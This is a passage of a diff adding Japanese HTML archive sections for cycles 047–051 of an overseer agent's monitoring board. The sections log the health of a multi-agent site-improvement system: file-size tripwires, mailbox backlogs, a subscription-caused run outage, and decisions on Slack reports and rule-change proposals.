+      <p class="text-xs text-gray-700"><strong>推奨（誰が・何を）</strong>：次に 3Dオフィス／status.php に手を入れる改修の際、上記4件を同乗で反映する（単独では着手しない＝承認済み見送りの尊重）。根本対応の選択肢（掲示板側に <span class="font-mono">data-question-id</span>／<span class="font-mono">data-status</span> 属性を持たせ構造抽出へ切替）は hp-loop／blog-loop の掲示板生成ルール変更を伴うため、やる場合は<strong>社長合意の上で各モードルールの改訂</strong>として扱う。<strong>効果</strong>：小〜中（堅牢性・情報最小化）／<strong>工数</strong>：小（各1点は小粒）／<strong>優先度</strong>：🟢低／<strong>関連</strong>：O-016（SYSTEM.md 未反映群と同じく「次の有人改修に同乗」型）／<strong>ステータス</strong>：📋 追跡中（判断不要）。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（軽い巡回）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>受信箱処理</strong>：<span class="font-mono">M-20260728T182647-hanasaka-main</span>（fyi・起票依頼）→ O-024 として起票し <span class="font-mono">cur/</span> へ移動。Slack スレッド情報なし（エージェント間 mailbox 便）＝スレッド返信は対象外。</li>
+        <li><strong>O-021 の予告確認</strong>：Cycle 050 の「本日 02:00 の daily 再開で復帰する見込み」を実測＝退避は再開（coverage 113.4KB・archive +1.7KB）。ただし tripwire 内（100KB）へは未達＝完全復帰は次サイクルで再確認。</li>
+        <li><strong>掲示板整理</strong>：Cycle 049 をアーカイブへ収容し、index を「最新（051）＋直近文脈（050）＋未完了の繰り越し」に維持。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿しない</strong>（O-024 は社長承認済みの見送り＝新規にお伝えする判断事項なし。O-021/O-019 は既報の状態更新のみ＝再督促しない）。</li>
+        <li><strong>自己改善</strong>：特記なし（<span class="font-mono">skill-kaizen.md</span> は O-019 で肥大中のため、特記なしの回は書き込み自体を控えて台帳を太らせない）。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Cycle 050（2026-07-28 Cycle 053 で index から収容・本文改変なし） -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 050 — 2026-07-28（<strong>精密診断（火曜 fallback）</strong> <span class="font-mono">/overseer</span>・<strong>🔴07-26深夜〜07-27朝の無人便12本が全滅（原因＝組織のサブスク側で Claude Code アクセス無効化・外部起因・昼に自然回復済み）＋初回の月次全体最適棚卸しを実施</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断。<strong>本来の月曜便（07-27 01:00）が当の障害で失敗したため、火曜 1:00 の fallback（本実行）が設計意図どおり肩代わり</strong>（※判定ルールの文言上は「軽く終える」誤判定になる穴を検出＝O-023）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド80件スキップ）／自分宛受信箱（<span class="font-mono">to: overseer</span> 0通）／<strong><span class="font-mono">failures.jsonl</span>＋<span class="font-mono">tick.log</span> の障害16件を実読（stderr 原文で原因文字列を特定）</strong>／<span class="font-mono">system-health.py</span> 実行（⚠️7件）／<strong>月次全体最適棚卸し（記録なし＝初回・当日実施の規定どおり）</strong>＝ルール群の本数・総量を初回計測／<span class="font-mono">new/</span> 9通の内訳／<span class="font-mono">hold/</span>・<span class="font-mono">memo-stock/</span>（ともに空）／git log（新規1件 <span class="font-mono">9b3176b</span>）・status（113件）／台帳・掲示板サイズ実測。</p>
+    <div class="border-l-4 border-red-400 bg-red-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>🔴新規の重大事象1件（復旧済み・原因確認をお願いします）＋ルールの穴1件＋既報の悪化2件・改善1件</strong>。詳細は下記処理ログおよび最新レポートの O-022／O-023 カードを参照（<strong>後日追記：O-022 の上流原因は「社長のカード決済が通らなかった」と 07-28 に判明＝Cycle 053 で反映</strong>）。(1) <strong>🔴O-022：07-26 23:00〜07-27 07:00、無人便12本が全て起動3〜5秒で異常終了（exit=1）</strong>＝stderr 原文は全便同一のサブスク無効化メッセージ。<strong>07-27 12:06 の反応tickから自然回復</strong>。(2) <strong>🟡O-023：火曜 fallback の判定ルールに穴</strong>（6日以内→「実施済み」誤判定）。(3) <strong>⚠️O-021 再悪化</strong>：ycom coverage 135KB（退避は 07-25 02:25 が最後＝daily 2日欠落の二次被害）・ycom 掲示板 index 82KB＝80KB tripwire 初超過。(4) <strong>✅O-018 良</strong>：partner が自己ローテ（ledger 163.4→68KB・掲示板 99.5→76KB＝自己修復3例目）。(5) <strong>⚠️O-019</strong>：skill-kaizen 171.9→255KB（+83KB/4日）。(6) mailbox：<span class="font-mono">new/</span> 9通＝yoshida-dev 4→1通（07-27 pickup・良）・web-hanasaka 5通（最古5.2日）・fujisaka-dev 3通（35.4日）。(7) git：新規 <span class="font-mono">9b3176b</span>・未コミット 113件。(8) <strong>月次全体最適棚卸し：2026-07-28（初回）</strong>＝<span class="font-mono">rules/modes/</span> 16本368KB・<span class="font-mono">rules/</span>直下68KB・<span class="font-mono">.claude/commands/</span> 29本156KB。(9) 定点清浄＝孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空。</p>
+    </div>
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（精密診断＋月次棚卸し）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>障害の原因確定（O-022）</strong>：<span class="font-mono">failures.jsonl</span> の 07-26 23:00〜07-27 07:00 の12件（memo・overseer・hp-loop×6・blog×3・partner）を確認後、<span class="font-mono">tick.log</span> の各失敗時 stderr（<span class="font-mono">»</span> 行）を実読＝全便が同一のサブスク無効化メッセージで即死。件数（12件）でなく<strong>1つの外部起因</strong>として1カードに集約。回復時刻は「07-27 12:06 yoshida 反応tick が ALERT なしで完走」で特定。障害中も <span class="font-mono">agent-tick.sh</span> の純シェル警報（Slack 発報・throttle 付き）と <span class="font-mono">failures.jsonl</span> 追記は設計どおり機能＝<strong>監視層は無言停止しなかった（良）</strong>。</li>
+        <li><strong>fallback の運用判断（O-023 の実地適用）</strong>：ルール文言（6日以内→軽く終える）と設計意図（月曜が成功していれば）が今回食い違ったため、<strong>意図を優先して精密診断を実施し、文言の修正はルール編集ゲートに従い提案に留めた</strong>（無人実行はフックで編集不可＝正しい制約が働いている）。</li>
+        <li><strong>system-health.py 実行（T-018）</strong>：⚠️7件＝skill-kaizen 255KB／ycom coverage 135KB／ycom index 82KB／timeout 3回・異常終了12回（読めた3.3日分）／fujisaka-dev 35.4日／web-hanasaka 5.2日。トレンド比較元なし（7日分の履歴未蓄積＝次回から比較可）。</li>
+        <li><strong>月次全体最適棚卸し（初回・2026-07-28）</strong>：①本数と総量＝モードルール16本368KB＋コマンド29本156KB＋共通ルール68KB（自動ロードは 2ファイル/10KB に抑制済み＝07-24 移設の効果が維持）②重複・流用切れ＝partner.md の数値 tripwire 未継承（O-018 で既起票）以外に新規の二重記述は検出せず ③見直し日が古い領域＝<span class="font-mono">task-partner.md</span>（0.4・コマンド未作成のまま＝O-004）と <span class="font-mono">reviewer.md</span> が長期未更新だが実害なし ④簡素化候補＝hp-loop.md 68KB・partner.md 44KB の2本で全体の30%。<strong>結論＝深掘りは既起票の「棚卸し1セッション」（O-018/019/021 一括）で足りる。新規の全体最適セッション提案は立てない（重複回避）</strong>。</li>
+        <li><strong>O-021 の因果整理</strong>：coverage 135KB は「規律のサボり」でなく<strong>障害の二次被害</strong>（退避を担う daily が 07-26 timeout・07-27 fail で2日欠落）。</li>
+        <li><strong>O-020 の圧縮（v0.4 規定・10連続到達）</strong>：判断待ちボックスの詳細カードを「繰り越し1行＋二択」に圧縮し、Slack 再督促を停止。</li>
+        <li><strong>掲示板整理</strong>：Cycle 048 をアーカイブへ収容し、index を「最新（050）＋直近文脈（049）＋未完了の繰り越し」に維持。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿する</strong>（🔴O-022＝障害の事後報告と原因確認のお願い・週次 blog 便の扱いのご判断・O-023 の承認依頼）。</li>
+        <li><strong>自己改善</strong>：気づき＝「大量の故障カウント（12件）はまず stderr 1行の実読で『同一原因か』を確定してから起票する。件数で12枚のカードを切らず、外部起因1件＋二次被害（coverage 退避停止）に分解できた」を <span class="font-mono">skill-kaizen.md</span> に記録。</li>
+      </ul>
+    </div>
+    <p class="text-xs text-gray-400">※ 本セクションは index の 80KB tripwire 超過（85KB）に伴い Cycle 053 で収容。健康サマリのみ、原文の長大な1段落を要点保持のうえ圧縮（数値・結論は改変なし）。処理ログ・見出しは原文のまま。</p>
+  </section>
+
+  <!-- Cycle 049（2026-07-28 Cycle 051 で index から収容・本文改変なし） -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 049 — 2026-07-24（<strong>精密診断</strong> <span class="font-mono">/overseer</span>・<strong>新規の綻びなし＝長期案件2件の急性症状が自己修復で解消（良）＋partner 掲示板の tripwire 初超過と skill-kaizen の加速を記録</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断（本日の精密診断が未実施＝前回は Cycle 048・07-23）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド79件スキップ・<span class="font-mono">ratelimited</span> なし）／自分宛受信箱（<span class="font-mono">to: overseer</span> 0通）／<span class="font-mono">new/</span> 9通の to/from/ts/subject 全件確認＋<strong>ID 集合の差分</strong>（K-325）／<span class="font-mono">hold/</span>・<span class="font-mono">memo-stock/</span>（ともに空）／<span class="font-mono">last-tick.txt</span>（07-24 01:00・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>）／git log（新規1件）・status（93件）／台帳サイズ実測（partner ledger＋<strong>新設 ledger-archive</strong>・skill-kaizen・ycom coverage＋archive）／<strong>掲示板 index 全8サイト＋partner＋blog＋overseer のサイズ一括実測</strong>／<span class="font-mono">partner.md</span> の tripwire 有無を <span class="font-mono">grep</span> で照合／新サイト2件の状態再確認（<span class="font-mono">sites/*.md</span> L11/L20・<span class="font-mono">agent-tick.sh</span> dispatch）／<span class="font-mono">grep hp-prospect SYSTEM.md</span>（地図ドリフト検出）／rally・konjaku の週次（月曜）稼働仕様との整合。</p>
+
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は健全・新規の綻びなし。長期2案件の急性症状がいずれもモード自身の自己修復で解消（良）＋新事実3件</strong>。(1) <strong>✅O-021 の急性症状が解消</strong>：2日続いた tripwire 超過（100.6→108.5KB）が <strong>07-23 02:14 daily の退避で 99.4KB へ復帰</strong>（archive 261.4→263.6KB・履歴不消失）。実害は一度も発生せず。(2) <strong>✅O-018 も partner の自己ローテで解消</strong>：Cycle 069（07-23 17:39）が Cycle 066〜006 の61行を新設 <span class="font-mono">data/partner/ledger-archive.md</span>（144KB）へ移設し <strong>280KB→137KB（−51%）</strong>。<strong>バイト検算済み・未完了 A-NNN は1件も移していない</strong>。＝hp-loop（K-303）と同じ「ルール改定を待たず自力収束」パターンの2例目。(3) <strong>🆕新事実＝<span class="font-mono">partner.md</span> は hp-loop の数値 tripwire を継承していない</strong>：<span class="font-mono">grep</span> で確認したところ3層プロトコル・archive の記述はあるが「80KB／100KB」等の閾値が無い。結果、<strong>掲示板 <span class="font-mono">site/business/partner/index.html</span> が 36.2→99.5KB＝80KB tripwire を初超過</strong>（07-23 は反応tickが11本走った特異日＝Cycle 061→071 を1本にまとめた長大ナラティブが主因）。ledger も移設後<strong>3時間で 137→163.4KB</strong>。＝O-018 に構造の根として集約（新規起票はしない）。(4) <strong>⚠️O-019 が加速</strong>：skill-kaizen 147→<strong>171.9KB（+24.9KB/日＝これまでの4倍速・単日で過去最大）</strong>。実読すると1件が1,000字級の長文＝件数でなく1件の長さが主因。(5) mailbox：<span class="font-mono">new/</span> 7→<strong>9通・pickup 0件</strong>（追加＝yoshida Cycle 042 便・blog-loop-ycom Cycle 042 便）＝拠点PCは 07-22 以降 未稼働の見込み。fujisaka-dev <strong>32日</strong>・yoshida-dev 4通・web-hanasaka 2通（Cycle 070 便が2日未 pickup）。(6) git：新規コミット <span class="font-mono">1123754</span>（claude-rules＝システム対象外）・未コミット 88→<strong>93件</strong>。(7) <strong>地図ドリフト検出</strong>：新モード <span class="font-mono">/hp-prospect</span>（rules 0.2＋コマンド）が <span class="font-mono">SYSTEM.md</span> に<strong>0件</strong>・hp-loop も 0.13→<strong>0.14</strong>＝O-016 の差分がまた拡大。(8) 掲示板 index は partner を除く全件が 80KB tripwire 内（ycom 69.1〔不変〕・yoshida 53.2・fujisaka 50.5・yokohawaii 43.9・rally 24.0・konjaku 19.8・shigatoyota 11.7・osakatoyopet 9.9・ycom blog 57.4・overseer 33.6KB）。rally/konjaku の 07-20（月）以降の無更新は<strong>週次・月曜運用（2026-07-08 社長決定）どおりで正常</strong>。(9) 定点清浄＝孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・<span class="font-mono">to: overseer/partner/rule-kaizen</span> 0・Slack 16サイクル連続正常。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（精密診断）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>O-018 自己修復の裏取り</strong>：<span class="font-mono">data/partner/</span> に <span class="font-mono">ledger-archive.md</span>（144,430B・07-23 17:39）が新設されているのを実測で確認し、<span class="font-mono">ledger.md</span> 冒頭の実施記録（280KB→137KB・分割の行数とバイトを検算・未完了は移さず・「二度目の先送りをせず実行」）を実読。統括の督促でなく<strong>モード自身の宣言→実行</strong>で片づいた点を good として記録。</li>
+        <li><strong>partner の tripwire 欠落を照合</strong>：<span class="font-mono">rules/modes/partner.md</span> を <span class="font-mono">grep</span>（ローテ／archive／KB）＝3層プロトコルの文章はあるが<strong>数値閾値の記述ゼロ</strong>。hp-loop.md の「掲示板80KB／台帳100KB」が流用されていない＝SYSTEM.md の健康シグナル「共通部の流用整合」に該当する構造欠落として O-018 に統合（別番号を立てず騒音を増やさない）。</li>
+        <li><strong>O-021 復帰の実測</strong>：<span class="font-mono">coverage.md</span> <strong>99,427B（mtime 07-23 02:14）</strong>・<span class="font-mono">coverage-archive.md</span> <strong>263,643B</strong>＝daily の通常運用で tripwire 内へ復帰。カードを圧縮し、過去5日分の追記はアーカイブ側の履歴に委ねた（index の堆積防止・v0.4 の規定と同型）。</li>
+        <li><strong>mailbox の ID 差分（K-325 適用2回目）</strong>：前サイクル7通 → 本サイクル9通で<strong>除去0・追加2</strong>（<span class="font-mono">M-20260723T023751-hp-loop-yoshida</span>／<span class="font-mono">M-20260723T050741-blog-loop-ycom</span>）。件数増だけでなく「pickup が1件も起きていない」ことを明示的に確認できた＝拠点PC未稼働の判定根拠。</li>
+        <li><strong>地図ドリフト検出（O-016）</strong>：<span class="font-mono">grep -c hp-prospect SYSTEM.md</span> ＝ <strong>0</strong>。健康シグナル「新モード名で grep して0件なら未反映」が設計どおり機能。O-016 カードに <span class="font-mono">/hp-prospect</span> と hp-loop 0.14 を追記。</li>
+        <li><strong>正常判定（誤検知の回避）</strong>：rally・konjaku の掲示板が 07-20 以降 無更新＝一見「4日停止」だが、<span class="font-mono">agent-tick.sh</span> のコメントで<strong>入力凍結ループは週次・月曜運用（2026-07-08 社長決定）</strong>と確認＝仕様どおり。綻びとして起票しない。</li>
+        <li><strong>掲示板整理</strong>：Cycle 047 を<a href="archive.html" class="text-blue-600 hover:underline">アーカイブ</a>へ収容し、index を「最新（049）＋直近文脈（048）＋未完了の繰り越し」に絞る。O-021 カードを圧縮、O-020 は9連続据え置きを明示（次で10＝1行圧縮へ）。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿する</strong>（ご判断の中身が変わったため）＝O-021/O-018 の急性症状が両方とも自己修復で片づき、<strong>残る作業が「棚卸し1セッションで tripwire を明文化するだけ」に縮小</strong>したこと、および partner 掲示板の 80KB 超過（未報告の新事実）をお伝えする。</li>
+        <li><strong>自己改善</strong>：気づき＝「<strong>統括が据え置き案件を追い続けると、当のモードが自分で直していることを見落としやすい</strong>。O-021・O-018 とも解決はモード自身の自己修復で、統括の督促ではなかった。長期カードは『社長の判断待ち』と『モードが自力で動ける部分』を分けて追い、後者が動いたら<strong>カードを縮める</strong>（＝残る判断だけを提示する）」を <span class="font-mono">skill-kaizen.md</span> に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Cycle 048（2026-07-28 Cycle 050 で index から収容・本文改変なし） -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 048 — 2026-07-23（<strong>精密診断</strong> <span class="font-mono">/overseer</span>・<strong>新規の綻びなし＝R-028 往復の完全決着（良）＋O-021「退避しても純増」への悪化を記録</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断（本日の精密診断が未実施＝前回は Cycle 047・07-22）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド79件スキップ・<span class="font-mono">ratelimited</span> なし）／自分宛受信箱（<span class="font-mono">to: overseer</span> 0通）／<span class="font-mono">new/</span> 7通の to/ts/subject 全件確認＋<strong>メッセージ ID 集合の差分</strong>で入れ替わりを追跡（K-325 の教訓を初適用）／<span class="font-mono">hold/</span>・<span class="font-mono">memo-stock/</span>（ともに空）／<span class="font-mono">last-tick.txt</span>（07-23 01:00・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>）／git log（新規なし）・status（88件）／台帳サイズ実測（partner ledger・skill-kaizen・ycom coverage＋archive・掲示板 index 4種）／新サイト2件の状態再確認（<span class="font-mono">sites/*.md</span> 北極星 L11/L20 実読・<span class="font-mono">agent-tick.sh</span> dispatch）。</p>
+
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は健全・新規の綻びなし。良い決着1件＋既報トレンドの悪化1件</strong>。(1) <strong>✅web-hanasaka との往復が完全解消</strong>：<span class="font-mono">new/</span> の ID 差分で、前サイクル残置の web-hanasaka 宛3通（<strong>R-028 引き渡し便 <span class="font-mono">M-20260718T152220</span> 含む</strong>）が 07-22 に全件 pickup されたことを確認。さらに hp-loop-ycom の新投函（Cycle 070・07-22 20:13）の件名が「<strong>R-028回答受領（クローズ）</strong>＋新規3件引き渡し（R-037/038/039）」＝統括が約40サイクル追跡した R-028 の長期停滞が決着し、新規往復も回っている（正常フロー）。(2) <strong>⚠️O-021 は「退避しても純増」の段階へ悪化</strong>：coverage <strong>108.5KB（100.6→108.5・+7.9KB/日・2サイクル連続 tripwire 超過・過去最大）</strong>。07-22 の夜サイクルは archive へ <strong>+11KB 退避を実施した</strong>（250→<strong>261.4KB</strong>・履歴不消失）にもかかわらず純増着地＝規定のサボりではなく<strong>収支の構造問題</strong>と確定（判断材料は既出＝棚卸し一括・新規起票はしない）。(3) skill-kaizen 141→<strong>147KB</strong>（+6KB/日・O-019 10サイクル目）。(4) partner ledger 213.5→<strong>218.9KB</strong>（O-018 <strong>11連続据え置き</strong>・1行圧縮維持）。(5) git：HEAD 不変（<span class="font-mono">4a11954</span>）・未コミット 86→<strong>88件（+2）</strong>。(6) mailbox：<span class="font-mono">new/</span> 7通＝fujisaka-dev 宛3通（<strong>31日滞留</strong>・不変）＋yoshida-dev 宛3通（6〜8日）＋web-hanasaka 宛1通（07-22 新規便）。(7) 掲示板 index 4種は 80KB tripwire 内（ycom <strong>69.1KB</strong>〔66.7→69.1・増勢継続・要観察〕・partner 36.2・overseer 33.6・ycom blog 56.7KB）。(8) 新サイト2件は変化なし＝O-020 <strong>8連続据え置き</strong>（北極星「AI起草・社長確認待ち」・dispatch 6サイトのまま）。(9) 定点清浄＝孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・Slack 15サイクル連続正常。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（精密診断）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>往復決着の裏取り（ID 差分・K-325 初適用）</strong>：前サイクルの <span class="font-mono">new/</span> 9通と本サイクル7通を ID 集合で比較＝除去3通（web-hanasaka 宛・R-028 便含む＝pickup）・追加1通（<span class="font-mono">M-20260722T201328-hp-loop-ycom</span>＝Cycle 070 レポート便）。件数の増減（9→7）だけでは見えない「懸念便の解消＋新規便の正常投函」を分離して確認。</li>
+        <li><strong>O-021 追跡（悪化の定量化）</strong>：coverage 実測 <strong>108,565B（mtime 07-22 20:09）</strong>・archive <strong>261,384B（+11KB）</strong>＝同一サイクル内で退避を実施してなお純増。監視指標を「ローテ実施の有無」から「退避量と埋め戻し量の収支」へ切り替える必要を確認（K-0723 に記録）。実害はまだ無し。</li>
+        <li><strong>台帳サイズ実測（前日比）</strong>：<span class="font-mono">data/partner/ledger.md</span> <strong>218.9KB</strong>（213.5→218.9・archive 不存在・O-018 11連続）／<span class="font-mono">data/hp-improve/skill-kaizen.md</span> <strong>147KB</strong>（141→147・O-019 10サイクル目）。</li>
+        <li><strong>git</strong>：新規コミットなし（HEAD <span class="font-mono">4a11954</span> のまま）。未コミット 88件（+2）。O-009 カードを更新。</li>
+        <li><strong>新サイト整合（O-020 追跡）</strong>：<span class="font-mono">sites/shigatoyota.md</span>・<span class="font-mono">osakatoyopet.md</span> L11/L20 実読＝北極星は「AI起草＝社長確認待ち」のまま。<span class="font-mono">agent-tick.sh</span> dispatch は6サイト（shigatoyota/osakatoyopet なし）。変化なし＝8サイクル連続据え置きを明示（再督促はしない）。</li>
+        <li><strong>掲示板整理</strong>：Cycle 046 を<a href="archive.html" class="text-blue-600 hover:underline">アーカイブ</a>へ収容し、index を「最新（048）＋直近文脈（047）＋未完了の繰り越し」に絞る。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿しない</strong>（新規の綻びなし。R-028 決着は良いニュースで判断不要・O-021 悪化は既報カードの追記で足り、ご判断の内容〔棚卸し1セッション一括〕は不変＝新たな判断材料ではない）。</li>
+        <li><strong>自己改善</strong>：気づき＝「台帳肥大の監視は『ローテ実施の有無』でなく『退避量と埋め戻し量の収支』で追う。実施フラグだけ見ると規律が守られていると誤読する（07-22 は +11KB 退避してなお純増 +7.9KB）」を <span class="font-mono">skill-kaizen.md</span> K-0723 に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Cycle 047（2026-07-24 Cycle 049 で index から収容・本文改変なし） -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 047 — 2026-07-22（<strong>精密診断</strong> <span class="font-mono">/overseer</span>・<strong>新規の綻びなし＝良い動き2件（実装往復の再開・新規コミット）＋O-021 tripwire 初突破の記録</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断（本日の精密診断が未実施＝前回は Cycle 046・07-21）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド80件スキップ・<span class="font-mono">ratelimited</span> なし）／自分宛受信箱（<span class="font-mono">to: overseer</span> 0通）／<span class="font-mono">new/</span> 9通の to/ts/subject 全件確認＋<span class="font-mono">cur/</span> 直近の出入り確認（往復再開の裏取り）／<span class="font-mono">hold/</span>・<span class="font-mono">memo-stock/</span>（ともに空）／<span class="font-mono">last-tick.txt</span>（07-22 01:00・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>）／git log（新規2件）・status（86件）／台帳サイズ実測（partner ledger・skill-kaizen・ycom coverage＋archive・掲示板 index 4種）／新サイト2件の状態再確認（<span class="font-mono">sites/*.md</span> 北極星・<span class="font-mono">agent-tick.sh</span> dispatch）。</p>
+
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は健全・新規の綻びなし。良い動き2件＋既報トレンドの更新</strong>。(1) <strong>✅web-hanasaka との実装往復が連休明け（07-21 火）に再開</strong>：<span class="font-mono">cur/</span> に web-hanasaka からの報告2通（11:01・20:26 着＝hp-loop-ycom が処理済み）と hp-loop-ycom の検証 ack（20:36「price FAQPage 前倒し／FAQカテゴリ整理／共通MV刷新＝報告と一致・退行なし」）を確認＝前サイクルの確認点「連休明け初営業日の pickup」は<strong>解消</strong>。ただし <strong>R-028 引き渡し便（07-18）だけ未 pickup 4日目</strong>＝要観察。(2) <strong>✅新規コミット2件</strong>（<span class="font-mono">b35e2e4</span>・<span class="font-mono">4a11954</span>＝claude-rules テンプレ強化＋deck-format 汎用移植）・未コミット 87→<strong>86件</strong>（O-009 進展）。(3) <strong>O-021 の振動が tripwire を初突破</strong>：coverage <strong>100.6KB（100KB 超）</strong>・07-21 20:35 の<strong>反応サイクル</strong>が台帳を更新し必須ローテを実施せず終了＝「daily は退避するが反応tickが埋め戻す」構造の新しい証跡（実害はまだ無し・本日 02:00 daily の再ローテを次サイクルで確認）。archive は 244→<strong>250KB</strong>（退避継続・履歴不消失）。(4) skill-kaizen 135.5→<strong>141KB</strong>（+5.4KB/日・O-019 9サイクル目）。(5) partner ledger 208.6→<strong>213.5KB</strong>（O-018 <strong>10連続据え置き＝overseer v0.4 の規定により掲示板カードを「1行＋二択」に圧縮</strong>・詳細はアーカイブへ）。(6) mailbox：<span class="font-mono">new/</span> 9通だが構成入れ替わり（fujisaka-dev 3通＝<strong>30日滞留</strong>・yoshida-dev 3通＝5〜7日・web-hanasaka 3通＝R-028便＋07-21 新規2通）。(7) 掲示板 index 4種は 80KB tripwire 内（ycom <strong>66.7KB</strong>〔57→66.7・増勢・要観察〕・partner 34.8・overseer 31.9・ycom blog 53.5KB）。(8) 新サイト2件は変化なし＝O-020 <strong>7連続据え置き</strong>（北極星「AI起草・社長確認待ち」・dispatch 6サイトのまま）。(9) 定点清浄＝孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・Slack 14サイクル連続正常。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（精密診断）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>往復再開の裏取り</strong>：<span class="font-mono">cur/</span> の mtime 順で <span class="font-mono">M-20260721T110110-web-hanasaka</span>（報告・11:06 に hp-loop-ycom が返信）→<span class="font-mono">M-20260721T202635-web-hanasaka</span>（報告・20:36 に ack）を確認＝拠点PCは 07-21 に稼働・双方向とも流れた。一方 <span class="font-mono">new/</span> の <span class="font-mono">M-20260718T152220</span>（R-028→PI-032 統合の引き渡し）は残置＝新旧の選択的な読み残しの可能性。次サイクルで残っていれば一手前連絡に格上げ。</li>
+        <li><strong>O-021 追跡（tripwire 突破）</strong>：coverage 実測 <strong>100,621B（mtime 07-21 20:35）</strong>＝反応サイクル（ack 処理）が台帳更新後、必須ローテ（100KB 超で実施してから終える）を行わずに終了。ルール上の規定が「daily の重いサイクル」でしか実効していない証跡として O-021 カードに追記（新規起票はしない＝同根）。</li>
+        <li><strong>台帳サイズ実測（前日比）</strong>：<span class="font-mono">data/partner/ledger.md</span> <strong>213.5KB</strong>（208.6→213.5・archive 不存在・O-018 10連続→v0.4 規定で1行圧縮）／<span class="font-mono">data/hp-improve/skill-kaizen.md</span> <strong>141KB</strong>（135.5→141・O-019 9サイクル目）。</li>
+        <li><strong>git</strong>：新規コミット2件（<span class="font-mono">b35e2e4</span>・<span class="font-mono">4a11954</span>）＝いずれも claude-rules テンプレ（システム対象外領域）・myagent 本体の版・構造への影響なし。未コミット 86件。O-009 カードに「✅進展あり」を追記。</li>
+        <li><strong>新サイト整合（O-020 追跡）</strong>：config 8サイト⇔<span class="font-mono">agent-tick.sh</span> dispatch 6サイト（shigatoyota/osakatoyopet なし）・両サイトの北極星は「AI起草＝社長確認待ち」のまま（<span class="font-mono">sites/*.md</span> L11/L20 を実読）。変化なし＝7サイクル連続据え置きを明示（再督促はしない）。</li>
+        <li><strong>掲示板整理</strong>：Cycle 045 をアーカイブへ収容し、index を「最新（047）＋直近文脈（046）＋未完了の繰り越し」に絞る。O-018 カードを v0.4 規定（10サイクル超の据え置きは1行＋二択に圧縮・再督促停止）に従い圧縮。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿しない</strong>（新規の綻びなし。往復再開・新規コミットは良いニュースで判断不要・O-021 突破は既報トレンド内で本日 daily のローテ見込み＝新たなご判断材料ではない）。</li>
+        <li><strong>自己改善</strong>：気づき＝「mailbox の滞留は<strong>件数の増減だけでは入れ替わり（turnover）を見逃す</strong>。前サイクルまで『9通不変』と追っていたが、実際は宛先内で pickup と新規投函が相殺されていた。滞留監視は件数でなく<strong>メッセージ ID/ts 集合の差分</strong>で見る」を <span class="font-mono">skill-kaizen.md</span> K-325 に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Cycle 046（2026-07-23 Cycle 048 で index から収容・本文改変なし） -->
+  <section class="mb-10">
